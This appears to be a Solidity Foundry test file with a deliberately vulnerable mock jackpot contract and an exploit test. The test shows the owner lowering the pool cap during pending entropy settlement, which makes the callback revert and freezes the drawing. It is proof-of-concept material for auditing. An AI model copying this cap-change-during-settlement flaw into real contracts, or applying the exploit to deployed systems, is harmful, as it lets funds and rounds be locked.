// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEntropyConsumer {
    function scaledEntropyCallback(uint256 drawingId, uint256 randomWord) external;
}

contract MockJackpotLPManager {
    mapping(uint256 => uint256) public lpPoolCap;
    mapping(uint256 => uint256) public lpValue;

    function setLPPoolCap(uint256 drawingId, uint256 newCap) external {
        lpPoolCap[drawingId] = newCap;
    }

    function deposit(uint256 drawingId, uint256 amount) external {
        require(lpValue[drawingId] + amount <= lpPoolCap[drawingId], "cap exceeded");
        lpValue[drawingId] += amount;
    }

    function settle(uint256 drawingId) external view {
        require(lpValue[drawingId] <= lpPoolCap[drawingId], "live LP exceeds cap");
    }
}

contract VulnerableJackpot {
    address public owner;
    MockJackpotLPManager public jackpotLPManager;

    uint256 public currentDrawingId;
    uint256 public governancePoolCap;
    uint256 public normalBallMax;
    uint256 public lpEdgeTarget;

    bool public drawingLocked;
    bool public awaitingEntropy;
    bool public drawingFinalized;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(MockJackpotLPManager _lpManager) {
        owner = msg.sender;
        jackpotLPManager = _lpManager;

        currentDrawingId = 1;
        governancePoolCap = 1_000 ether;
        normalBallMax = 50;
        lpEdgeTarget = 10;

        jackpotLPManager.setLPPoolCap(currentDrawingId, _calculateLpPoolCap(governancePoolCap, normalBallMax, lpEdgeTarget));
    }

    function _calculateLpPoolCap(
        uint256 _governancePoolCap,
        uint256 _normalBallMax,
        uint256 _lpEdgeTarget
    ) internal pure returns (uint256) {
        return (_governancePoolCap * _lpEdgeTarget) / _normalBallMax;
    }

    function depositLP(uint256 amount) external {
        require(!drawingLocked, "drawing locked");
        jackpotLPManager.deposit(currentDrawingId, amount);
    }

    function runJackpot() external onlyOwner {
        require(!drawingLocked, "already locked");
        drawingLocked = true;
        awaitingEntropy = true;
        drawingFinalized = false;
    }

    function setGovernancePoolCap(uint256 newCap) external onlyOwner {
        governancePoolCap = newCap;
        jackpotLPManager.setLPPoolCap(
            currentDrawingId,
            _calculateLpPoolCap(governancePoolCap, normalBallMax, lpEdgeTarget)
        );
    }

    function setNormalBallMax(uint256 newMax) external onlyOwner {
        normalBallMax = newMax;
        jackpotLPManager.setLPPoolCap(
            currentDrawingId,
            _calculateLpPoolCap(governancePoolCap, normalBallMax, lpEdgeTarget)
        );
    }

    function setLpEdgeTarget(uint256 newTarget) external onlyOwner {
        lpEdgeTarget = newTarget;
        jackpotLPManager.setLPPoolCap(
            currentDrawingId,
            _calculateLpPoolCap(governancePoolCap, normalBallMax, lpEdgeTarget)
        );
    }

    function scaledEntropyCallback(uint256 drawingId, uint256) external {
        require(awaitingEntropy, "not awaiting");
        require(drawingId == currentDrawingId, "wrong drawing");

        jackpotLPManager.settle(drawingId);

        awaitingEntropy = false;
        drawingLocked = false;
        drawingFinalized = true;
        currentDrawingId += 1;

        jackpotLPManager.setLPPoolCap(
            currentDrawingId,
            _calculateLpPoolCap(governancePoolCap, normalBallMax, lpEdgeTarget)
        );
    }
}

contract ExploitTest is Test {
    MockJackpotLPManager lpManager;
    VulnerableJackpot jackpot;

    address owner = address(0xABCD);
    address lp = address(0xBEEF);
    address entropy = address(0xCAFE);

    function setUp() public {
        vm.startPrank(owner);
        lpManager = new MockJackpotLPManager();
        jackpot = new VulnerableJackpot(lpManager);
        vm.stopPrank();

        vm.deal(owner, 100 ether);
        vm.deal(lp, 100 ether);
        vm.deal(entropy, 100 ether);
    }

    function test_exploit() public {
        uint256 drawingId = jackpot.currentDrawingId();
        uint256 initialCap = lpManager.lpPoolCap(drawingId);

        // Step 1: LP funds the current drawing close to the existing cap.
        uint256 depositAmount = initialCap - 1 ether;
        vm.prank(lp);
        jackpot.depositLP(depositAmount);

        assertEq(lpManager.lpValue(drawingId), depositAmount);
        assertEq(lpManager.lpPoolCap(drawingId), initialCap);
        assertLt(lpManager.lpValue(drawingId), lpManager.lpPoolCap(drawingId));

        // Step 2: Owner runs the jackpot, locking the drawing and waiting for async entropy callback.
        vm.prank(owner);
        jackpot.runJackpot();

        assertTrue(jackpot.drawingLocked());
        assertTrue(jackpot.awaitingEntropy());
        assertEq(jackpot.currentDrawingId(), drawingId);

        // Step 3: While settlement is pending, owner maliciously/sharply lowers governancePoolCap.
        // New cap = (100 ether * 10) / 50 = 20 ether, which is below the already-live LP amount.
        vm.prank(owner);
        jackpot.setGovernancePoolCap(100 ether);

        uint256 reducedCap = lpManager.lpPoolCap(drawingId);
        assertLt(reducedCap, depositAmount);
        assertGt(lpManager.lpValue(drawingId), reducedCap);

        // Step 4: Entropy callback tries to finalize the drawing, but settlement now reverts
        // because LP live value exceeds the newly reduced cap.
        vm.prank(entropy);
        vm.expectRevert(bytes("live LP exceeds cap"));
        jackpot.scaledEntropyCallback(drawingId, 123456);

        // Step 5: Assert harmful outcome: round is frozen and cannot progress.
        assertTrue(jackpot.drawingLocked());
        assertTrue(jackpot.awaitingEntropy());
        assertFalse(jackpot.drawingFinalized());
        assertEq(jackpot.currentDrawingId(), drawingId);

        // The system remains stuck on the same drawing, demonstrating governance-induced DoS.
    }
}